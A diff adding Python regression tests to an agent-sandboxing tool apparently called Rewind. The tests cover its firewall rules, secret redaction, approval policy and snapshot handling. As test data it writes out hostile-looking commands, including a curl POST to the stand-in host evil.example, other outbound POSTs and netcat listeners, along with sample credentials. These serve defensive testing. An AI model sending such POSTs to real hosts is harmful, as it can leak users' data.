@@ -695,8 +695,171 @@ class LowFindingTests(unittest.TestCase):
     def test_guard_script_drops_unsolicited_inbound(self):
         from rewind.environment import _guard_script
         script = _guard_script(["8.8.8.8"])
-        lines = script.splitlines()
+        lines = [line.strip() for line in script.splitlines()]
         drop = lines.index("iptables -A INPUT -j DROP")
-        self.assertLess(lines.index("iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT"), drop)
+        conntrack = next(i for i, l in enumerate(lines) if "iptables -A INPUT -m conntrack" in l
+                         and not l.startswith("ip6tables") and "ip6tables" not in l)
+        self.assertLess(conntrack, drop)
         self.assertLess(lines.index("iptables -A INPUT -i lo -j ACCEPT"), drop)
-        self.assertIn("  ip6tables -A INPUT -j DROP", lines)
+        self.assertIn("ip6tables -A INPUT -j DROP", lines)
+        # ICMPv6 (neighbour discovery) is accepted before the IPv6 drop.
+        self.assertLess(lines.index("ip6tables -A INPUT -p ipv6-icmp -j ACCEPT"), lines.index("ip6tables -A INPUT -j DROP"))
+        nd_out = lines.index("ip6tables -A OUTPUT -p ipv6-icmp --icmpv6-type neighbour-solicitation -j ACCEPT")
+        self.assertLess(nd_out, lines.index("ip6tables -A OUTPUT -d fe80::/10 -j REJECT"))
+
+
+TASK = "Demo Task"  # make_env's task id
+
+
+class ReviewRoundTwoTests(unittest.TestCase):
+    """Regressions for the second review (of the hardening commit)."""
+
+    def setUp(self):
+        registry.clear()
+
+    # H-a / H-b and the older slow patterns: agent text must never stall Hermes.
+    def test_redaction_and_policy_stay_fast_on_adversarial_input(self):
+        from rewind.policy import is_mutating, irreversible_reason, may_run_hooks, script_irreversible_reason
+        inputs = [
+            "docker login " * 1000, "docker " * 400 + "login " * 1000, "sshpass " * 4000, "mysql " * 4000,
+            "A" * 40000, "TOKEN" * 8000, " " * 40000, "urlopen(" + " " * 8000, "Request(" + "x" * 40000,
+            "urlopen(" + "(" * 8000, "password:" * 6000, "x='" * 8000, "token=" * 6000, "?sig=" * 8000,
+            "'password': '" * 4000, "\"password\": \"" + "\\" * 20000, "curl -d x " * 3000,
+        ]
+        for text in inputs:
+            for fn in (redact, irreversible_reason, script_irreversible_reason, is_mutating, may_run_hooks):
+                started = time.perf_counter()
+                fn(text)
+                self.assertLess(time.perf_counter() - started, 1.0, f"{fn.__name__} on {text[:30]!r}...")
+
+    def test_redaction_false_positives_are_gone(self):
+        for command in ("if token == expected: pass", 'author = "bob"', "bypass = true",
+                        "grep password: config.yml", "sed 's/token: x/y/' f", "sshpass -f pw ssh -p 2222 host",
+                        "sshpass -e ssh -p 22 host", "docker run -v ./login:/x -p 8080:80 img",
+                        "mysql -u root -p db"):
+            self.assertEqual(redact(command), command)
+        for command, secret in (("AWS_SECRET_ACCESS_KEY = abcd", "abcd"), ("my_token = 'abc'", "abc"),
+                                ("  token: abc", "abc"), ('echo "password: hunter2"', "hunter2"),
+                                ("sshpass -f pw -p hunter2 ssh h", "hunter2"),
+                                ("mysql --port 3306 -pS3cret", "S3cret")):
+            self.assertNotIn(secret, redact(command), command)
+
+    # M-a: two processes resuming one parked record.
+    def test_only_one_process_can_take_over_a_parked_record(self):
+        store = Store(Path(tempfile.mkdtemp()))
+        first = make_env(FakeDocker(), keep_hours=1, store=store)
+        first.execute("rm a")
+        first.cleanup()
+        record = store.load(TASK)
+        registry.clear()
+        fake = FakeDocker()
+        fake.image_info[record["image"]] = "100 3"
+        resumed = make_env(fake, keep_hours=1, store=store)
+        self.assertEqual(resumed.repository, record["repository"])
+        # The record is claimed at once, before any command runs...
+        claimed = store.load(TASK)
+        self.assertEqual(claimed["status"], "live")
+        self.assertEqual(claimed["owner_pid"], os.getpid())
+        # ...so another sandbox for the same task starts fresh, with its own names.
+        registry.clear()
+        other = make_env(fake, keep_hours=1, store=store)
+        self.assertNotEqual(other.repository, resumed.repository)
+        self.assertNotEqual(other.container, resumed.container)
+        self.assertEqual(other.snapshots, [])
+
+    def test_a_held_lock_means_start_fresh(self):
+        store = Store(Path(tempfile.mkdtemp()))
+        first = make_env(FakeDocker(), keep_hours=1, store=store)
+        first.execute("rm a")
+        first.cleanup()
+        registry.clear()
+        with store.claim(TASK) as held:
+            self.assertTrue(held)
+            fake = FakeDocker()
+            fake.image_info[store.load(TASK)["image"]] = "100 3"
+            started = time.monotonic()
+            env = make_env(fake, keep_hours=1, store=store)
+            self.assertLess(time.monotonic() - started, 5)
+            self.assertEqual(env.snapshots, [])
+        self.assertFalse(store.path(TASK).with_suffix(".lock").exists())
+
+    # M-b: a folder of the user's own is never marked or purged.
+    def test_existing_user_folder_is_not_adopted_by_exports(self):
+        from rewind.environment import EXPORT_MARKER, export_folders
+        from .test_security import fake_tar_reader
+        dest = Path(tempfile.mkdtemp())
+        (dest / "demo-task").mkdir()
+        (dest / "demo-task" / "photos.zip").write_text("mine")
+        env = make_env(FakeDocker())
+        env._tar_reader = fake_tar_reader([])
+        copied = env.export("app", dest)
+        self.assertEqual(copied.parent.parent.name, "demo-task-rewind")
+        self.assertFalse((dest / "demo-task" / EXPORT_MARKER).exists())
+        self.assertEqual(export_folders(dest), [dest / "demo-task-rewind"])
+        again = env.export("app", dest)  # reuses Rewind's own folder
+        self.assertEqual(again.parent.parent.name, "demo-task-rewind")
+
+    # L-a: parking after a failed start removes the network holder.
+    def test_park_removes_a_leftover_holder(self):
+        store = Store(Path(tempfile.mkdtemp()))
+        fake = FakeDocker()
+        env = make_env(fake, keep_hours=1, store=store, network="internet")
+        env.execute("rm a")
+        fake.fail_images.add(env.snapshots[0].image)
+        with self.assertRaises(RewindError):
+            env.restore("last")  # the start and its fallback both... the fallback works here
+        env._started = False  # as if the fallback failed too
+        fake.calls.clear()
+        env.cleanup()
+        self.assertIn(["docker", "rm", "-f", env.netns_container], fake.calls)
+
+    # L-b: approval keys name the real host(s).
+    def test_http_hosts_skip_option_values_and_cover_ips(self):
+        from rewind.policy import irreversible_reason
+        key = lambda c: tools._rule_key(irreversible_reason(c))
+        self.assertEqual(key("curl -X POST -o resp.json https://evil.example/x"),
+                         "rewind-irreversible-curl-post-evil.example")
+        self.assertEqual(key("curl -sSo out.txt -d x https://a.example"), "rewind-irreversible-curl-post-a.example")
+        self.assertEqual(key("curl -d x localhost:8000/api"), "rewind-irreversible-curl-post-localhost")
+        self.assertEqual(key("curl -d x 203.0.113.5/x"), "rewind-irreversible-curl-post-203.0.113.5")
+        self.assertNotEqual(key("curl -d x 203.0.113.5/x"), key("curl -d x localhost/x"))
+        both = key("curl -d x https://b.example https://a.example")
+        self.assertIn("a.example", both)
+        self.assertIn("b.example", both)
+        self.assertEqual(key("curl --url https://u.example -d x"), "rewind-irreversible-curl-post-u.example")
+        unknown_a, unknown_b = key('curl -d x "$URL"'), key('curl -d y "$OTHER"')
+        self.assertNotEqual(unknown_a, unknown_b)
+
+    # L-d / L-e
+    def test_env_git_counts_as_hookable_and_listeners_dont_prompt(self):
+        self.assertTrue(policy.may_run_hooks("env git status"))
+        self.assertTrue(policy.may_run_hooks("env -u PAGER git log"))
+        self.assertTrue(policy.may_run_hooks("sudo git diff"))
+        self.assertIsNone(policy.irreversible_reason("nc -l 8000"))
+        self.assertIsNone(policy.irreversible_reason("nc -lvp 8000"))
+        self.assertIsNone(policy.script_irreversible_reason("Request(url, method='GET')"))
+        self.assertIsNotNone(policy.script_irreversible_reason("urlopen(url, b'x')"))
+
+    # L-f
+    def test_audit_source_has_no_invisible_characters(self):
+        source = Path(audit.__file__).read_text(encoding="utf-8")
+        self.assertTrue(source.isascii())
+        line = audit.describe({"event": "x", "v": "a\u061cb\u00adc"})
+        self.assertIn(r"\u061c", line)
+        self.assertIn(r"\xad", line)
+
+    # L-i: no conntrack keeps outbound filtering and says inbound is open.
+    def test_missing_conntrack_keeps_network_and_warns(self):
+        class NoConntrack(FakeDocker):
+            def __call__(self, argv, timeout=None):
+                if argv[1] == "run" and "--rm" in argv and any("conntrack" in a for a in argv):
+                    self.calls.append(list(argv))
+                    return 0, "REWIND_INBOUND_OPEN\nREWIND_GUARD_OK\n"
+                return super().__call__(argv, timeout)
+
+        fake = NoConntrack()
+        env = make_env(fake, network="internet")
+        result = env.execute("ls")
+        self.assertIn("can't filter connections *into* the sandbox", result["output"])
+        run = [c for c in fake.calls if c[1] == "run" and "-d" in c and c[c.index("--name") + 1] == env.container][-1]
+        self.assertEqual(run[run.index("--network") + 1], "container:" + env.netns_container)
